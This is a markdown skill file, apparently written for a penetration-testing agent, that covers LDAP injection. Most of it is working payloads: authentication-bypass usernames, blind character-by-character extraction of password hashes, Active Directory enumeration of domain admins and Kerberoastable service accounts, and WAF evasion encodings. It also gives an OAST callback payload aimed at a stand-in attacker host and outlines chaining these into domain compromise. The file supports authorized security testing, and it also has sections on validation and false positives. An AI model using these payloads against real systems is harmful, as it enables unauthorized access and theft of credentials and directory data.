---
name: ldap_injection
description: LDAP injection testing for filter manipulation, authentication bypass, blind data exfiltration, and Active Directory attacks
---

# LDAP Injection

LDAP injection manipulates Lightweight Directory Access Protocol filter expressions to bypass authentication, enumerate directory data, or escalate privileges. Applications constructing LDAP filters from user input without proper encoding are vulnerable. Active Directory environments are particularly sensitive due to the richness of stored attributes.

## Attack Surface

**Scope**
- Login forms querying AD/OpenLDAP for authentication
- Search/filter features (user lookup, group membership, directory browsing)
- SSO/OAuth integrations resolving users against LDAP
- Password reset flows verifying user existence
- Any application constructing LDAP filter strings from user input

**Vulnerable Filter Patterns**
```
(&(uid={input})(userPassword={pass}))
(|(cn={input})(mail={input}))
(&(objectClass=person)(sAMAccountName={input}))
```

**Injection Characters**
| Char | Purpose |
|------|---------|
| `*`  | Wildcard match |
| `(` `)` | Filter grouping |
| `&` | AND operator |
| `|` | OR operator |
| `!` | NOT operator |
| `\00` | Null byte terminator |
| `\xx` | Hex-encoded special chars |

## High-Value Targets

### Authentication Bypass

**Classic OR injection**
```
Username: *)(uid=*))(|(uid=*
Password: anything
Result filter: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
→ First half always true, auth bypass
```

**Admin-specific bypass**
```
Username: admin*)(uid=*))(|(uid=*
Password: anything
Result filter: (&(uid=admin*)(uid=*))(|(uid=*)(userPassword=anything))
```

**Wildcard bypass**
```
Username: admin*
Password: *
Result filter: (&(uid=admin*)(userPassword=*))
→ Matches admin with any password (if server allows wildcard in password)
```

**Null byte truncation**
```
Username: admin\00
Password: anything
Result filter: (&(uid=admin\00)(userPassword=anything))
→ Some C-based LDAP libs truncate at null
```

### Data Exfiltration

**Attribute enumeration**
```
Search: *)(objectClass=*
→ Returns all objects, enumerating directory

Search: *)(sAMAccountName=a*
→ Brute-force usernames starting with 'a'

Search: *)(userPassword=a*
→ Extract password hashes character by character
```

**Blind boolean**
```
Filter: (&(uid=admin)(userPassword=a*)) → returns result if password starts with 'a'
Filter: (&(uid=admin)(userPassword=b*)) → no result, try next char
```

### Active Directory Specific Attacks

**Domain enumeration**
```
Search: *)(objectClass=domain)
→ Extract domain naming contexts

Search: *)(objectCategory=computer)
→ Enumerate all computers in domain
```

**Privilege discovery**
```
Search: *)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local
→ Find domain admins

Search: *)(adminCount=1)
→ Find privileged accounts
```

**Password policy extraction**
```
Search: *)(objectClass=domainDNS)
→ Read minPwdLength, pwdHistoryLength, pwdProperties
```

**Service account discovery**
```
Search: *)(servicePrincipalName=*/*
→ Find Kerberoastable service accounts

Search: *)(msDS-AllowedToDelegateTo=*)
→ Find constrained delegation accounts
```

## Blind LDAP Injection

### Timing-Based Extraction
```
# Use LDAP_MATCHING_RULE_IN_CHAIN for timing
(&(uid=admin)(userPassword=a*)(memberOf=CN=Domain Admins,...))
# Slower processing when matching rule in chain is true

# OR use nested group resolution for delay
(&(uid=admin)(|(userPassword=a*)(memberOf=CN=nested-group,...)))
```

### OAST-Based Detection
```
# If LDAP server supports URL references (ldaps:// or ldap://)
# Inject filter that triggers DNS/HTTP callback:
*)(objectClass=*)(description=http://attacker.oast.fun/*
# Some LDAP servers attempt to fetch URL values in attributes
```

### Differential Extraction
```
# Compare response size/behavior with true vs false conditions
True:  *)(objectClass=*)(uid=admin)(userPassword=a*)  → 200 OK, user object
False: *)(objectClass=*)(uid=admin)(userPassword=z*)  → empty result
# Binary search: extract passwords/attributes char by char
```

## Bypass Techniques

**WAF/Filter Evasion**
```
# Null byte in filter
*)(\00uid=admin*

# Hex encoding (OpenLDAP)
*)(uid=\61\64\6d\69\6e)  → 'admin'

# Unicode normalization
*)(uid=\u0061\u0064\u006d\u0069\u006e)  → 'admin'

# Wildcard nesting
*)(uid=a*d*m*i*n*)  → matches 'admin'

# Case manipulation (if case-insensitive)
*)(UID=ADMIN*

# Attribute alias abuse
*)(sAMAccountName=admin)  vs  *)(samaccountname=admin)
```

**LDAP-specific bypass**
```
# DN injection (if input used in DN construction)
Input: admin,OU=Users,DC=corp,DC=local)(cn=*
Breaks out of DN context into filter

# Filter injection via search base
Base: DC=corp,DC=local)(objectClass=*
Filter: (uid=*)  → searches all objects

# Referral chasing
# Inject references to attacker-controlled LDAP server
```

## Testing Methodology

1. **Identify LDAP usage** — Check for LDAP libraries (python-ldap, ldapjs, JNDI, System.DirectoryServices), LDAP URIs in config, AD-integrated auth flows
2. **Map filter structure** — Observe request/response patterns for login, search, and group membership checks. Identify which parameters map to which filter components
3. **Test authentication bypass** — Inject wildcard, OR, and null-byte payloads into username fields: `admin*)`, `*)(uid=*))(|(uid=*`, `admin\00`
4. **Test search injection** — Inject into search/filter fields: `*`, `*)(objectClass=*`, `*)(memberOf=*`
5. **Blind extraction** — If boolean results differ, extract data char-by-char via wildcard patterns
6. **AD enumeration** — Test for attribute extraction: `objectClass`, `memberOf`, `servicePrincipalName`, `adminCount`, `msDS-*`
7. **WAF bypass** — If blocked, try hex encoding, null bytes, Unicode escapes, mixed case, attribute aliasing
8. **Escalation** — Chain auth bypass with AD enumeration for domain compromise

## Validation

1. Confirm filter manipulation produces different result sets vs normal input
2. Demonstrate auth bypass: login as another user without valid credentials
3. Show data exfiltration: extract at least one attribute value not normally accessible
4. For blind injection: prove character-by-character extraction with known test values
5. Document the exact filter construction, injection point, and payload

## False Positives

- Properly escaped LDAP input (RFC 4515 encoding of special chars)
- Applications using parameterized LDAP APIs (Java DirContext.search with parameter arrays)
- Wildcard-all (`*`) returning same results as specific query (large directory, coincidental match)
- Server-side input validation rejecting special characters before filter construction
- AD returning "referral" responses that appear different but are not injection-caused

## Impact

- Full authentication bypass on LDAP-integrated applications
- Directory data exfiltration: usernames, emails, groups, password hashes, service accounts
- Active Directory domain enumeration and privilege escalation
- Kerberoasting via servicePrincipalName enumeration
- Potential for further AD attack chains (delegation abuse, DC replication)

## Pro Tips

1. Always test `*` wildcard first — many LDAP servers allow it in password fields
2. Check if application distinguishes "user not found" vs "wrong password" — enables username enumeration
3. Use `ldapsearch -x -H ldap://target -b "DC=corp,DC=local" "(uid=*)"` to map the directory structure first
4. For AD: `servicePrincipalName=*` is the highest-value enumeration query (Kerberoast prep)
5. Test both DN injection (input used in base DN) and filter injection (input used in search filter)
6. OpenLDAP vs Active Directory handle wildcards and encoding differently — test both
7. When blind injection is confirmed, write a Python script using `python-ldap` for systematic char-by-char extraction
8. Monitor LDAP server logs (if accessible) to confirm filter injection occurred and verify exact filter received
